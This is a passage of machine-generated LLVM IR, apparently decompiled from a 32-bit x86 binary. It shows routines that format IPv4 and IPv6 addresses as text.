  uselistorder label %dec_label_pc_8051d06, { 6, 4, 7, 5, 8, 9, 0, 1, 3, 2, 10 }
  uselistorder label %dec_label_pc_8051cd5, { 1, 0 }
  uselistorder label %dec_label_pc_8051cb7, { 1, 0 }
  uselistorder label %dec_label_pc_8051c9d, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8051c66, { 1, 0 }
  uselistorder label %dec_label_pc_8051c26, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8051c66.outer, { 1, 0 }
}

define i32 @function_8051d10(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8051d10:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-33 = alloca i32, align 4
  %stack_var_-31 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %v0_8051d11 = load i32, i32* @edi, align 4
  %v0_8051d12 = load i32, i32* @esi, align 4
  store i32 0, i32* @esi, align 4
  %v15_8051d16 = ptrtoint i32* %stack_var_-76 to i32
  %v0_8051d19 = load i32, i32* @eax, align 4
  %v3_8051d1d = and i32 %v0_8051d19, -65536
  %v2_8051d23 = ptrtoint i32* %stack_var_-31 to i32
  store i1 false, i1* @df, align 1
  %v0_8051d28 = load i32, i32* @edx, align 4
  %v0_8051d2c = load i32, i32* @ecx, align 4
  store i32 %v3_8051d1d, i32* %stack_var_-33, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 0, i32* %stack_var_-31, align 4
  %v6_8051d37 = add i32 %v2_8051d23, 4
  store i32 %v6_8051d37, i32* %edi.global-to-local, align 4
  %v2_8051d38 = inttoptr i32 %v6_8051d37 to i32*
  store i32 0, i32* %v2_8051d38, align 4
  %v3_8051d38 = load i32, i32* %edi.global-to-local, align 4
  %v6_8051d38 = add i32 %v3_8051d38, 4
  store i32 %v6_8051d38, i32* %edi.global-to-local, align 4
  %v0_8051d39 = load i32, i32* %eax.global-to-local, align 4
  %v2_8051d39 = inttoptr i32 %v6_8051d38 to i32*
  store i32 %v0_8051d39, i32* %v2_8051d39, align 4
  %v3_8051d39 = load i32, i32* %edi.global-to-local, align 4
  %v6_8051d39 = add i32 %v3_8051d39, 4
  store i32 %v6_8051d39, i32* %edi.global-to-local, align 4
  %v0_8051d3a = load i32, i32* %eax.global-to-local, align 4
  %v1_8051d3a = trunc i32 %v0_8051d3a to i16
  %v3_8051d3a = inttoptr i32 %v6_8051d39 to i16*
  store i16 %v1_8051d3a, i16* %v3_8051d3a, align 2
  %v4_8051d3a = load i32, i32* %edi.global-to-local, align 4
  %v7_8051d3a = add i32 %v4_8051d3a, 2
  %v0_8051d3c = load i32, i32* %eax.global-to-local, align 4
  %v1_8051d3c = trunc i32 %v0_8051d3c to i8
  %v3_8051d3c = inttoptr i32 %v7_8051d3a to i8*
  store i8 %v1_8051d3c, i8* %v3_8051d3c, align 1
  store i32 0, i32* %edi.global-to-local, align 4
  %v0_8051dd724 = load i32, i32* @esi, align 4
  %v10_8051dd727 = icmp eq i32 %v0_8051dd724, 3
  store i1 %v10_8051dd727, i1* %zf.global-to-local, align 1
  %v7_8051dda29 = icmp sgt i32 %v0_8051dd724, 3
  br i1 %v7_8051dda29, label %dec_label_pc_8051de0, label %dec_label_pc_8051d44

dec_label_pc_8051d44:                             ; preds = %dec_label_pc_8051db7, %dec_label_pc_8051d10
  %v3_8051d5a = phi i32 [ 0, %dec_label_pc_8051d10 ], [ %v1_8051de0.pre, %dec_label_pc_8051db7 ]
  %v0_8051dd730 = phi i32 [ %v0_8051dd724, %dec_label_pc_8051d10 ], [ %v0_8051dd7, %dec_label_pc_8051db7 ]
  %v2_8051d4a = add i32 %v0_8051dd730, %v0_8051d19
  %v12_8051d4a = icmp eq i32 %v2_8051d4a, 0
  store i1 %v12_8051d4a, i1* %zf.global-to-local, align 1
  store i32 %v2_8051d4a, i32* %ebp.global-to-local, align 4
  %v1_8051d4c = inttoptr i32 %v2_8051d4a to i8*
  %v2_8051d4c = load i8, i8* %v1_8051d4c, align 1
  %v3_8051d4c = zext i8 %v2_8051d4c to i32
  %v4_8051d4c = load i32, i32* @edx, align 4
  %v5_8051d4c = and i32 %v4_8051d4c, -65536
  %v6_8051d4c = or i32 %v5_8051d4c, %v3_8051d4c
  store i32 %v6_8051d4c, i32* %edx.global-to-local, align 4
  %div5 = udiv i8 %v2_8051d4c, 100
  %v6_8051d53 = zext i8 %div5 to i32
  %tmp21 = urem i8 %v2_8051d4c, 100
  %v12_8051d53 = zext i8 %tmp21 to i32
  %v14_8051d53 = mul nuw nsw i32 %v12_8051d53, 256
  %v15_8051d53 = or i32 %v6_8051d53, %v5_8051d4c
  %v16_8051d53 = or i32 %v15_8051d53, %v14_8051d53
  store i32 %v16_8051d53, i32* %eax.global-to-local, align 4
  %v2_8051d57 = or i8 %div5, 48
  store i1 false, i1* %zf.global-to-local, align 1
  %v2_8051d5a = load i32, i32* @esp, align 4
  %v4_8051d5a = add i32 %v2_8051d5a, 43
  %v5_8051d5a = add i32 %v4_8051d5a, %v3_8051d5a
  %v6_8051d5a = inttoptr i32 %v5_8051d5a to i8*
  store i8 %v2_8051d57, i8* %v6_8051d5a, align 1
  %v0_8051d5e = load i32, i32* %edi.global-to-local, align 4
  %v1_8051d5e = add i32 %v0_8051d5e, 1
  store i32 %v0_8051d5e, i32* @ecx, align 4
  %v0_8051d67 = load i32, i32* @esp, align 4
  %v2_8051d67 = add i32 %v0_8051d5e, 43
  %v3_8051d67 = add i32 %v2_8051d67, %v0_8051d67
  %v4_8051d67 = inttoptr i32 %v3_8051d67 to i8*
  %v5_8051d67 = load i8, i8* %v4_8051d67, align 1
  %v11_8051d67 = icmp eq i8 %v5_8051d67, 48
  store i1 %v11_8051d67, i1* %zf.global-to-local, align 1
  %v1_8051d6c = icmp eq i1 %v11_8051d67, false
  %v0_8051d96 = load i32, i32* %edx.global-to-local, align 4
  br i1 %v1_8051d6c, label %dec_label_pc_8051d94, label %dec_label_pc_8051d6e

dec_label_pc_8051d6e:                             ; preds = %dec_label_pc_8051d44
  %v3_8051d72 = trunc i32 %v0_8051d96 to i16
  %v5_8051d72 = udiv i16 %v3_8051d72, 10
  store i32 10, i32* %ebx.global-to-local, align 4
  %tmp = urem i16 %v5_8051d72, 256
  %tmp33 = urem i16 %tmp, 10
  %tmp22 = zext i16 %tmp33 to i32
  store i32 %tmp22, i32* %edx.global-to-local, align 4
  %v1_8051d84 = trunc i16 %tmp33 to i8
  %v2_8051d84 = or i8 %v1_8051d84, 48
  %v12_8051d84 = zext i8 %v2_8051d84 to i32
  store i32 %v12_8051d84, i32* %eax.global-to-local, align 4
  %v7_8051d86 = icmp eq i8 %v1_8051d84, 0
  store i1 %v7_8051d86, i1* %zf.global-to-local, align 1
  store i8 %v2_8051d84, i8* %v4_8051d67, align 1
  %v0_8051d8c = load i1, i1* %zf.global-to-local, align 1
  br i1 %v0_8051d8c, label %dec_label_pc_8051db7, label %dec_label_pc_8051d8e

dec_label_pc_8051d8e:                             ; preds = %dec_label_pc_8051d6e
  store i32 %v1_8051d5e, i32* @ecx, align 4
  br label %dec_label_pc_8051db7

dec_label_pc_8051d94:                             ; preds = %dec_label_pc_8051d44
  store i32 %v1_8051d5e, i32* %ebx.global-to-local, align 4
  %v3_8051d9c = trunc i32 %v0_8051d96 to i16
  %v5_8051d9c = udiv i16 %v3_8051d9c, 10
  %tmp34 = urem i16 %v5_8051d9c, 256
  %tmp35 = urem i16 %tmp34, 10
  %tmp23 = zext i16 %tmp35 to i32
  store i32 %tmp23, i32* %edx.global-to-local, align 4
  %v1_8051dac = add i32 %v0_8051d5e, 2
  store i32 %v1_8051dac, i32* @ecx, align 4
  %v1_8051db1 = trunc i16 %tmp35 to i8
  %v2_8051db1 = or i8 %v1_8051db1, 48
  store i1 false, i1* %zf.global-to-local, align 1
  %v12_8051db1 = zext i8 %v2_8051db1 to i32
  store i32 %v12_8051db1, i32* %eax.global-to-local, align 4
  %v4_8051db3 = add i32 %v0_8051d5e, 44
  %v5_8051db3 = add i32 %v4_8051db3, %v0_8051d67
  %v6_8051db3 = inttoptr i32 %v5_8051db3 to i8*
  store i8 %v2_8051db1, i8* %v6_8051db3, align 1
  br label %dec_label_pc_8051db7

dec_label_pc_8051db7:                             ; preds = %dec_label_pc_8051d6e, %dec_label_pc_8051d8e, %dec_label_pc_8051d94
  %v0_8051db7 = load i32, i32* %ebp.global-to-local, align 4
  %v1_8051db7 = inttoptr i32 %v0_8051db7 to i8*
  %v2_8051db7 = load i8, i8* %v1_8051db7, align 1
  %v3_8051db7 = zext i8 %v2_8051db7 to i32
  store i32 %v3_8051db7, i32* %eax.global-to-local, align 4
  %v0_8051dc0 = load i32, i32* @esi, align 4
  %v1_8051dc0 = add i32 %v0_8051dc0, 1
  store i32 %v1_8051dc0, i32* @esi, align 4
  store i32 10, i32* %ebx.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v0_8051dc5 = load i32, i32* @esp, align 4
  %v1_8051dc5 = load i32, i32* @ecx, align 4
  %v2_8051dc5 = add i32 %v0_8051dc5, 44
  %v3_8051dc5 = add i32 %v2_8051dc5, %v1_8051dc5
  %v4_8051dc5 = inttoptr i32 %v3_8051dc5 to i8*
  store i8 46, i8* %v4_8051dc5, align 1
  %v0_8051dca = load i32, i32* @ecx, align 4
  %v1_8051dca = add i32 %v0_8051dca, 2
  store i32 %v1_8051dca, i32* %edi.global-to-local, align 4
  %v0_8051dcd = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051dcd = load i32, i32* %eax.global-to-local, align 4
  %v2_8051dcd = zext i32 %v1_8051dcd to i64
  %v3_8051dcd = load i32, i32* %edx.global-to-local, align 4
  %v4_8051dcd = zext i32 %v3_8051dcd to i64
  %v5_8051dcd = mul nuw i64 %v4_8051dcd, 4294967296
  %v6_8051dcd = or i64 %v5_8051dcd, %v2_8051dcd
  %v7_8051dcd = zext i32 %v0_8051dcd to i64
  %v8_8051dcd = udiv i64 %v6_8051dcd, %v7_8051dcd
  %v9_8051dcd = trunc i64 %v8_8051dcd to i32
  %v10_8051dcd = urem i64 %v6_8051dcd, %v7_8051dcd
  %v11_8051dcd = trunc i64 %v10_8051dcd to i32
  store i32 %v11_8051dcd, i32* @edx, align 4
  %v3_8051dcf = and i32 %v9_8051dcd, -256
  %v1_8051dd1 = trunc i64 %v10_8051dcd to i8
  %v2_8051dd1 = add i8 %v1_8051dd1, 48
  %v12_8051dd1 = zext i8 %v2_8051dd1 to i32
  %v15_8051dd1 = or i32 %v12_8051dd1, %v3_8051dcf
  store i32 %v15_8051dd1, i32* %eax.global-to-local, align 4
  %v2_8051dd3 = load i32, i32* @esp, align 4
  %v4_8051dd3 = add i32 %v0_8051dca, 43
  %v5_8051dd3 = add i32 %v4_8051dd3, %v2_8051dd3
  %v6_8051dd3 = inttoptr i32 %v5_8051dd3 to i8*
  store i8 %v2_8051dd1, i8* %v6_8051dd3, align 1
  %v0_8051dd7 = load i32, i32* @esi, align 4
  %v10_8051dd7 = icmp eq i32 %v0_8051dd7, 3
  store i1 %v10_8051dd7, i1* %zf.global-to-local, align 1
  %v7_8051dda = icmp sgt i32 %v0_8051dd7, 3
  %v1_8051de0.pre = load i32, i32* %edi.global-to-local, align 4
  br i1 %v7_8051dda, label %dec_label_pc_8051de0, label %dec_label_pc_8051d44

dec_label_pc_8051de0:                             ; preds = %dec_label_pc_8051db7, %dec_label_pc_8051d10
  %v1_8051de0 = phi i32 [ 0, %dec_label_pc_8051d10 ], [ %v1_8051de0.pre, %dec_label_pc_8051db7 ]
  %v0_8051de0 = load i32, i32* @esp, align 4
  %v2_8051de0 = add i32 %v0_8051de0, 42
  %v3_8051de0 = add i32 %v2_8051de0, %v1_8051de0
  %v4_8051de0 = inttoptr i32 %v3_8051de0 to i8*
  store i8 0, i8* %v4_8051de0, align 1
  %v0_8051de5 = load i32, i32* @esp, align 4
  %v9_8051de5 = icmp eq i32 %v0_8051de5, 12
  store i1 %v9_8051de5, i1* %zf.global-to-local, align 1
  %v2_8051de8 = ptrtoint i32* %stack_var_-33 to i32
  store i32 %v2_8051de8, i32* @edi, align 4
  store i32 %v2_8051de8, i32* %stack_var_-92, align 4
  %v1_8051ded = bitcast i32* %stack_var_-33 to i8*
  %v2_8051ded = call i32 @function_804d514(i8* %v1_8051ded)
  store i32 %v2_8051ded, i32* @eax, align 4
  %v15_8051df5 = icmp eq i32 %v2_8051ded, %v0_8051d2c
  store i1 %v15_8051df5, i1* %zf.global-to-local, align 1
  %tmp36 = icmp ugt i32 %v2_8051ded, %v0_8051d2c
  br i1 %tmp36, label %dec_label_pc_8051dfb, label %dec_label_pc_8051e0a

dec_label_pc_8051dfb:                             ; preds = %dec_label_pc_8051de0
  %v0_8051dfb = load i32, i32* %stack_var_-92, align 4
  %v1_8051dfb = call i32 @function_804baa4(i32 %v0_8051dfb)
  %v1_8051e00 = inttoptr i32 %v1_8051dfb to i32*
  store i32 28, i32* %v1_8051e00, align 4
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_8051e19.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8051e19

dec_label_pc_8051e0a:                             ; preds = %dec_label_pc_8051de0
  store i32 %v0_8051d28, i32* %stack_var_-92, align 4
  %v2_8051e11 = inttoptr i32 %v0_8051d28 to i8*
  %v3_8051e11 = call i32 @function_804d4f8(i8* %v2_8051e11, i32 %v2_8051de8)
  store i32 %v3_8051e11, i32* %eax.global-to-local, align 4
  %v0_8051e16 = load i32, i32* @esp, align 4
  %v6_8051e16 = icmp eq i32 %v0_8051e16, -16
  store i1 %v6_8051e16, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8051e19

dec_label_pc_8051e19:                             ; preds = %dec_label_pc_8051dfb, %dec_label_pc_8051e0a
  %v0_8051e20 = phi i32 [ 0, %dec_label_pc_8051dfb ], [ %v3_8051e11, %dec_label_pc_8051e0a ]
  %v0_8051e19 = phi i32 [ %v0_8051e19.pre, %dec_label_pc_8051dfb ], [ %v15_8051d16, %dec_label_pc_8051e0a ]
  %v9_8051e19 = icmp eq i32 %v0_8051e19, -60
  store i1 %v9_8051e19, i1* %zf.global-to-local, align 1
  store i32 %v0_8051d12, i32* @esi, align 4
  store i32 %v0_8051d11, i32* @edi, align 4
  ret i32 %v0_8051e20

; uselistorder directives
  uselistorder i32 %v0_8051dd7, { 2, 0, 1 }
  uselistorder i8 %v2_8051db1, { 1, 0 }
  uselistorder i32 %v0_8051d96, { 1, 0 }
  uselistorder i1 %v11_8051d67, { 1, 0 }
  uselistorder i32 %v1_8051d5e, { 1, 0 }
  uselistorder i32 %v5_8051d4c, { 1, 0 }
  uselistorder i32 %v0_8051dd724, { 1, 2, 0 }
  uselistorder i32 %v0_8051d28, { 1, 0 }
  uselistorder i32* %stack_var_-33, { 0, 2, 1 }
  uselistorder i32* %stack_var_-92, { 1, 0, 2 }
  uselistorder i1* %zf.global-to-local, { 1, 2, 3, 4, 5, 12, 6, 7, 8, 9, 10, 11, 0 }
  uselistorder i32 -16, { 0, 1, 18, 19, 20, 9, 11, 12, 8, 10, 3, 13, 7, 14, 15, 16, 17, 21, 31, 32, 4, 26, 22, 5, 23, 24, 25, 27, 28, 6, 29, 30, 2 }
  uselistorder i32 42, { 1, 0 }
  uselistorder i16 10, { 1, 3, 2, 4, 0, 5 }
  uselistorder i32 43, { 2, 3, 4, 0, 1 }
  uselistorder i8 48, { 9, 5, 6, 0, 7, 10, 11, 1, 8, 2, 3, 4 }
  uselistorder i32 -65536, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_8051e19, { 1, 0 }
  uselistorder label %dec_label_pc_8051db7, { 2, 1, 0 }
}

define i32 @function_8051e21(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8051e21:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-94 = alloca i32, align 4
  %stack_var_-124 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %v0_8051e22 = load i32, i32* @edi, align 4
  %v0_8051e23 = load i32, i32* @esi, align 4
  %v0_8051e24 = load i32, i32* @ebx, align 4
  %v15_8051e25 = ptrtoint i32* %stack_var_-108 to i32
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v9_8051e2c = icmp eq i32 %arg1, 2
  br i1 %v9_8051e2c, label %dec_label_pc_8051e3c, label %dec_label_pc_8051e31

dec_label_pc_8051e31:                             ; preds = %dec_label_pc_8051e21
  %v9_8051e31 = icmp eq i32 %arg1, 10
  %v1_8051e34 = icmp eq i1 %v9_8051e31, false
  br i1 %v1_8051e34, label %dec_label_pc_8051fdb, label %dec_label_pc_8051e54

dec_label_pc_8051e3c:                             ; preds = %dec_label_pc_8051e21
  store i32 %arg3, i32* @edx, align 4
  store i32 %arg4, i32* @ecx, align 4
  store i32 %arg2, i32* @eax, align 4
  %v3_8051e48 = call i32 @function_8051d10(i32 %v0_8051e24, i32 %v0_8051e23, i32 %v0_8051e22)
  store i32 %v3_8051e48, i32* %eax.global-to-local, align 4
  store i32 %v3_8051e48, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8051fe8

dec_label_pc_8051e54:                             ; preds = %dec_label_pc_8051e31
  store i32 %arg1, i32* %stack_var_-112, align 4
  %v2_8051e59 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_8051e59, i32* %eax.global-to-local, align 4
  store i32 %v2_8051e59, i32* %stack_var_-124, align 4
  %v4_8051e5e = bitcast i32* %stack_var_-48 to i8*
  %v5_8051e5e = call i32 @function_804d4e0(i8* %v4_8051e5e, i32 0, i32 32)
  store i32 %v5_8051e5e, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ecx.global-to-local, align 4
  %v2_8051e80 = add i32 %arg2, 1
  br label %dec_label_pc_8051e6a

dec_label_pc_8051e6a:                             ; preds = %dec_label_pc_8051e6a.dec_label_pc_8051e6a_crit_edge, %dec_label_pc_8051e54
  %v1_8051e8d = phi i32 [ %v15_8051e25, %dec_label_pc_8051e54 ], [ %v1_8051e8d.pre, %dec_label_pc_8051e6a.dec_label_pc_8051e6a_crit_edge ]
  %v0_8051e8562 = phi i32 [ 0, %dec_label_pc_8051e54 ], [ %v0_8051e91.pre, %dec_label_pc_8051e6a.dec_label_pc_8051e6a_crit_edge ]
  %v1_8051e73 = ashr i32 %v0_8051e8562, 31
  %v2_8051e74 = zext i32 %v0_8051e8562 to i64
  %v4_8051e74 = zext i32 %v1_8051e73 to i64
  %v5_8051e74 = mul nuw i64 %v4_8051e74, 4294967296
  %v6_8051e74 = or i64 %v5_8051e74, %v2_8051e74
  %v8_8051e74 = sdiv i64 %v6_8051e74, 2
  %v9_8051e74 = trunc i64 %v8_8051e74 to i32
  store i32 %v9_8051e74, i32* %eax.global-to-local, align 4
  store i32 %arg2, i32* %edx.global-to-local, align 4
  store i32 %v9_8051e74, i32* %ebx.global-to-local, align 4
  %v2_8051e7c = add i32 %v0_8051e8562, %arg2
  %v3_8051e7c = inttoptr i32 %v2_8051e7c to i8*
  %v4_8051e7c = load i8, i8* %v3_8051e7c, align 1
  %v5_8051e7c = zext i8 %v4_8051e7c to i32
  store i32 %v5_8051e7c, i32* %eax.global-to-local, align 4
  %v3_8051e80 = add i32 %v2_8051e80, %v0_8051e8562
  %v4_8051e80 = inttoptr i32 %v3_8051e80 to i8*
  %v5_8051e80 = load i8, i8* %v4_8051e80, align 1
  %v6_8051e80 = zext i8 %v5_8051e80 to i32
  store i32 %v6_8051e80, i32* %edx.global-to-local, align 4
  %v1_8051e85 = add i32 %v0_8051e8562, 2
  store i32 %v1_8051e85, i32* %ecx.global-to-local, align 4
  %v2_8051e88 = mul nuw nsw i32 %v5_8051e7c, 256
  %v2_8051e8b = or i32 %v6_8051e80, %v2_8051e88
  store i32 %v2_8051e8b, i32* %eax.global-to-local, align 4
  %v3_8051e8d = mul i32 %v9_8051e74, 4
  %v4_8051e8d = add i32 %v3_8051e8d, 60
  %v5_8051e8d = add i32 %v4_8051e8d, %v1_8051e8d
  %v6_8051e8d = inttoptr i32 %v5_8051e8d to i32*
  store i32 %v2_8051e8b, i32* %v6_8051e8d, align 4
  %v0_8051e91.pre = load i32, i32* %ecx.global-to-local, align 4
  %v7_8051e94 = icmp sgt i32 %v0_8051e91.pre, 15
  br i1 %v7_8051e94, label %dec_label_pc_8051e96, label %dec_label_pc_8051e6a.dec_label_pc_8051e6a_crit_edge

dec_label_pc_8051e6a.dec_label_pc_8051e6a_crit_edge: ; preds = %dec_label_pc_8051e6a
  %v1_8051e8d.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8051e6a

dec_label_pc_8051e96:                             ; preds = %dec_label_pc_8051e6a
  %v4_8051e54 = ptrtoint i32* %stack_var_-112 to i32
  store i32 0, i32* %edx.global-to-local, align 4
  store i32 -1, i32* @edi, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  %v0_8051ea0.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8051ea0

dec_label_pc_8051ea0:                             ; preds = %dec_label_pc_8051e96, %dec_label_pc_8051ecd
  %v0_8051ecd61 = phi i32 [ 0, %dec_label_pc_8051e96 ], [ %v1_8051ecd, %dec_label_pc_8051ecd ]
  %v0_8051eb860 = phi i32 [ -1, %dec_label_pc_8051e96 ], [ %v0_8051eb87, %dec_label_pc_8051ecd ]
  %v0_8051ed859 = phi i32 [ -1, %dec_label_pc_8051e96 ], [ %v0_8051ebd8, %dec_label_pc_8051ecd ]
  %v0_8051ee358 = phi i32 [ -1, %dec_label_pc_8051e96 ], [ %v0_8051ec812, %dec_label_pc_8051ecd ]
  %v2_8051ea0 = mul nuw nsw i32 %v0_8051ecd61, 4
  %v3_8051ea0 = add nuw nsw i32 %v2_8051ea0, 60
  %v4_8051ea0 = add i32 %v3_8051ea0, %v0_8051ea0.pre
  %v5_8051ea0 = inttoptr i32 %v4_8051ea0 to i32*
  %v6_8051ea0 = load i32, i32* %v5_8051ea0, align 4
  %v7_8051ea0 = icmp eq i32 %v6_8051ea0, 0
  %v1_8051ea5 = icmp eq i1 %v7_8051ea0, false
  %v10_8051eb8 = icmp eq i32 %v0_8051eb860, -1
  br i1 %v1_8051ea5, label %dec_label_pc_8051eb8, label %dec_label_pc_8051ea7

dec_label_pc_8051ea7:                             ; preds = %dec_label_pc_8051ea0
  %v1_8051eaa = icmp eq i1 %v10_8051eb8, false
  br i1 %v1_8051eaa, label %dec_label_pc_8051eb5, label %dec_label_pc_8051eac

dec_label_pc_8051eac:                             ; preds = %dec_label_pc_8051ea7
  store i32 %v0_8051ecd61, i32* %eax.global-to-local, align 4
  store i32 1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051ecd

dec_label_pc_8051eb5:                             ; preds = %dec_label_pc_8051ea7
  %v0_8051eb5 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051eb5 = add i32 %v0_8051eb5, 1
  store i32 %v1_8051eb5, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051ecd

dec_label_pc_8051eb8:                             ; preds = %dec_label_pc_8051ea0
  br i1 %v10_8051eb8, label %dec_label_pc_8051ecd, label %dec_label_pc_8051ebd

dec_label_pc_8051ebd:                             ; preds = %dec_label_pc_8051eb8
  %v10_8051ebd = icmp eq i32 %v0_8051ed859, -1
  %v0_8051ec6.pre = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051ec2 = load i32, i32* @ebp, align 4
  %v7_8051ec4 = icmp sgt i32 %v0_8051ec6.pre, %v1_8051ec2
  %or.cond = or i1 %v10_8051ebd, %v7_8051ec4
  br i1 %or.cond, label %dec_label_pc_8051ec6, label %dec_label_pc_8051eca

dec_label_pc_8051ec6:                             ; preds = %dec_label_pc_8051ebd
  store i32 %v0_8051ec6.pre, i32* @ebp, align 4
  store i32 %v0_8051ee358, i32* @edi, align 4
  br label %dec_label_pc_8051eca

dec_label_pc_8051eca:                             ; preds = %dec_label_pc_8051ebd, %dec_label_pc_8051ec6
  %v0_8051ebd10 = phi i32 [ %v0_8051ee358, %dec_label_pc_8051ec6 ], [ %v0_8051ed859, %dec_label_pc_8051ebd ]
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051ecd

dec_label_pc_8051ecd:                             ; preds = %dec_label_pc_8051eb8, %dec_label_pc_8051eb5, %dec_label_pc_8051eac, %dec_label_pc_8051eca
  %v0_8051ec812 = phi i32 [ %v0_8051ee358, %dec_label_pc_8051eb8 ], [ %v0_8051ee358, %dec_label_pc_8051eb5 ], [ %v0_8051ecd61, %dec_label_pc_8051eac ], [ -1, %dec_label_pc_8051eca ]
  %v0_8051eb87 = phi i32 [ -1, %dec_label_pc_8051eb8 ], [ %v0_8051eb860, %dec_label_pc_8051eb5 ], [ %v0_8051ecd61, %dec_label_pc_8051eac ], [ -1, %dec_label_pc_8051eca ]
  %v0_8051ebd8 = phi i32 [ %v0_8051ed859, %dec_label_pc_8051eb8 ], [ %v0_8051ed859, %dec_label_pc_8051eb5 ], [ %v0_8051ed859, %dec_label_pc_8051eac ], [ %v0_8051ebd10, %dec_label_pc_8051eca ]
  %v1_8051ecd = add nuw nsw i32 %v0_8051ecd61, 1
  store i32 %v1_8051ecd, i32* %edx.global-to-local, align 4
  %exitcond = icmp eq i32 %v1_8051ecd, 8
  br i1 %exitcond, label %dec_label_pc_8051ed3, label %dec_label_pc_8051ea0

dec_label_pc_8051ed3:                             ; preds = %dec_label_pc_8051ecd
  %v10_8051ed3 = icmp eq i32 %v0_8051ec812, -1
  br i1 %v10_8051ed3, label %dec_label_pc_8051ee5, label %dec_label_pc_8051ed8

dec_label_pc_8051ed8:                             ; preds = %dec_label_pc_8051ed3
  %v10_8051ed8 = icmp eq i32 %v0_8051ebd8, -1
  %v0_8051ee1.pre = load i32, i32* %ebx.global-to-local, align 4
  br i1 %v10_8051ed8, label %dec_label_pc_8051ee1, label %dec_label_pc_8051edd

dec_label_pc_8051edd:                             ; preds = %dec_label_pc_8051ed8
  %v1_8051edd = load i32, i32* @ebp, align 4
  %v7_8051edf = icmp sgt i32 %v0_8051ee1.pre, %v1_8051edd
  br i1 %v7_8051edf, label %dec_label_pc_8051ee1, label %dec_label_pc_8051ee5

dec_label_pc_8051ee1:                             ; preds = %dec_label_pc_8051ed8, %dec_label_pc_8051edd
  store i32 %v0_8051ee1.pre, i32* @ebp, align 4
  store i32 %v0_8051ec812, i32* @edi, align 4
  br label %dec_label_pc_8051ee5

dec_label_pc_8051ee5:                             ; preds = %dec_label_pc_8051edd, %dec_label_pc_8051ed3, %dec_label_pc_8051ee1
  %v5_8051ef2 = phi i32 [ %v0_8051ebd8, %dec_label_pc_8051edd ], [ %v0_8051ebd8, %dec_label_pc_8051ed3 ], [ %v0_8051ec812, %dec_label_pc_8051ee1 ]
  %v10_8051ee5 = icmp eq i32 %v5_8051ef2, -1
  br i1 %v10_8051ee5, label %dec_label_pc_8051ef5, label %dec_label_pc_8051eea

dec_label_pc_8051eea:                             ; preds = %dec_label_pc_8051ee5
  %v0_8051eea = load i32, i32* @ebp, align 4
  %v1_8051eea = add i32 %v0_8051eea, -1
  %v6_8051eea = sub i32 0, %v0_8051eea
  %v7_8051eea = and i32 %v0_8051eea, %v6_8051eea
  %v8_8051eea = icmp slt i32 %v7_8051eea, 0
  %v9_8051eea = icmp eq i32 %v1_8051eea, 0
  %v10_8051eea = icmp slt i32 %v1_8051eea, 0
  store i32 -1, i32* %eax.global-to-local, align 4
  %v3_8051ef2 = icmp ne i1 %v10_8051eea, %v8_8051eea
  %v4_8051ef2 = or i1 %v9_8051eea, %v3_8051ef2
  %v7_8051ef2 = select i1 %v4_8051ef2, i32 -1, i32 %v5_8051ef2
  store i32 %v7_8051ef2, i32* @edi, align 4
  br label %dec_label_pc_8051ef5

dec_label_pc_8051ef5:                             ; preds = %dec_label_pc_8051ee5, %dec_label_pc_8051eea
  %v0_8051f9517 = phi i32 [ %v5_8051ef2, %dec_label_pc_8051ee5 ], [ %v7_8051ef2, %dec_label_pc_8051eea ]
  %v2_8051ef5 = ptrtoint i32* %stack_var_-94 to i32
  store i32 %v2_8051ef5, i32* @ebx, align 4
  %v3_8051f77 = add i32 %v4_8051e54, 64
  %v12_8051f35 = icmp eq i32 %tmp, 65535
  store i32 0, i32* @esi, align 4
  %v10_8051f9550 = icmp eq i32 %v0_8051f9517, -1
  %v1_8051f3d = icmp eq i1 %v12_8051f35, false
  br label %dec_label_pc_8051f00

dec_label_pc_8051f00:                             ; preds = %dec_label_pc_8051ef5, %dec_label_pc_8051f8b
  %v10_8051f9557 = phi i1 [ %v10_8051f9550, %dec_label_pc_8051ef5 ], [ %v10_8051f95, %dec_label_pc_8051f8b ]
  %v0_8051f1a56 = phi i32 [ 0, %dec_label_pc_8051ef5 ], [ %v1_8051f8b, %dec_label_pc_8051f8b ]
  %v1_8051f1055 = phi i32 [ %v0_8051f9517, %dec_label_pc_8051ef5 ], [ %v0_8051f95.pre, %dec_label_pc_8051f8b ]
  %v0_8051f1e54 = phi i32 [ %v2_8051ef5, %dec_label_pc_8051ef5 ], [ %v0_8051f1418, %dec_label_pc_8051f8b ]
